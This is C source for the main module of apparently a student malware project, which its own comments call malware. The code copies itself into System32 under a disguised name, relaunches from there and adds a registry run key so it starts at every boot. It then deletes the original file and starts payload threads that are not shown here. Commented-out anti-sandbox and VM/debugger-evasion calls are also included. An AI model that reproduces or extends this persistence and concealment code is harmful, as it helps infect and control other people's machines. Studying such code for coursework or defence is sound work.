
#include "program/program.h"
#include "persistence/registry.h"
#include "env_detection/env_detector.h"

#include <stdio.h>

// give our malware a very unsuspicious name :)
#define EXEC_PATH1 "C:\\Windows\\System32\\JamesBond.exe"
#define EXEC_PATH2 "C:\\Windows\\SysWOW64\\JamesBond.exe"

#define FIRST_RUN_FROM_SYS32 "-007"
#define RUN_FROM_REGISTRY    "-006"


static void run(char* path, char* requArg);
static void copyAndLaunch(char* path);

BOOL is64Bit;

// ------------------------
// remove before submission
// ------------------------
void check() {   // just ensuring if I accidently run it then it doesn't infect me lol
    DWORD size = UNLEN + 1;
    char buffUser[size];
    if (!GetUserNameA(buffUser, &size)) { exit(1); }

    if (strcmp(buffUser, "louis") == 0) {
        exit(0);
    }
}

int main(int argc, char** argv) {
    check();

    // // Sleep for 5 minutes - anti sandbox technique!
    // Sleep(300000);

    // // detect vms, sandboxes, and debuggers!
    // ERR_CODE ret = detectAnalysisTools();
    // if (ret != ECODE_SAFE_RET) {
    //     printf("RET: %s", getErrMessage(ret));
    //     exit(1);
    // }

    // retrieve the bitness of the client computer,  returns true if the current 
    // process is being run by the 32-bit emulator on a windows 64-bit machine
    IsWow64Process(GetCurrentProcess(), &is64Bit);

    if (argc == 1) {
        copyAndLaunch(argv[0]);
    } else if (argc == 2) {
        run(argv[0], argv[1]);
    } else {
        exit(0);
    }
}

static void run(char* path, char* arg) {


    // ensure we are being run from the correct place and with correct argument
    if ((strcmp(path, EXEC_PATH1) != 0 && strcmp(path, EXEC_PATH2) != 0)
            || ((strcmp(arg, FIRST_RUN_FROM_SYS32) != 0) && strcmp(arg, RUN_FROM_REGISTRY) != 0)) { 
        exit(0);
    }

    // if we are being run on device satrtup then no need to make registry key again!
    if (strcmp(arg, RUN_FROM_REGISTRY) == 0) {  // -006
        Sleep(30000); // sleep for 30s so we have enough time to see the process running in procexp!
        goto __exec__;
    }

    // if we are being run from System32 for the first time! 
    // then we want to generate 
    if (strcmp(arg, FIRST_RUN_FROM_SYS32) == 0) {  // -007 
        ERR_CODE ret;
        if (!is64Bit) { ret = generateRegKey(EXEC_PATH1, RUN_FROM_REGISTRY, KEY_WRITE); } 
        else          { ret = generateRegKey(EXEC_PATH2, RUN_FROM_REGISTRY, KEY_WRITE | KEY_WOW64_64KEY); }

        if (ret != ECODE_SUCCESS) {
            printf("Failed to generate registry key.\n");
        }
    }

    __exec__:  // run the malware code as normal
    
    ERR_CODE ret = setup();  
    if (ret != ECODE_SUCCESS) {
        printErr(ret);
        programCleanup();
        exit(ret);
    }

    ret = startThreads();
    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

    programCleanup();
    exit(0);
}

static void copyAndLaunch(char* path) {
    FILE* original = fopen(path, "rb");
    FILE* target = fopen(EXEC_PATH1, "wb");
    if (original == NULL || target == NULL) { exit(1); }

    int ch;
    while ((ch = fgetc(original)) != EOF) { fputc(ch, target); }
    fclose(target); fclose(original);
    printf("Created SYS32 Executable..\n");

    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("Failed to open process token.\nExiting...\n");
        exit(1);
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // pass the token to our privileged process!, NULL, as well as the command to be executed
    // the NULL lets use use the command line
    char cmd[256];
    snprintf(cmd, 256, "\"%s\" %s", EXEC_PATH1, FIRST_RUN_FROM_SYS32);
    BOOL ret = CreateProcessAsUserA(
        hToken, NULL, cmd,
        NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
    );

    if(!ret) { exit(1); } // printf("CreateProcess failed (%ld).\n", GetLastError());
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Exiting worker...\n");
    remove(path); // remove the original module!
    exit(0);
}


// static void run();

// int main(int argc, char** argv) {
//     run();
// }

// static void run() {
//     int ret = setup();
//     if (ret != ECODE_SUCCESS) {
//         printErr(ret);
//         programCleanup();
//         exit(ret);
//     }

//     ret = startThreads();
//     printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));

//     programCleanup();
//     exit(0);
// }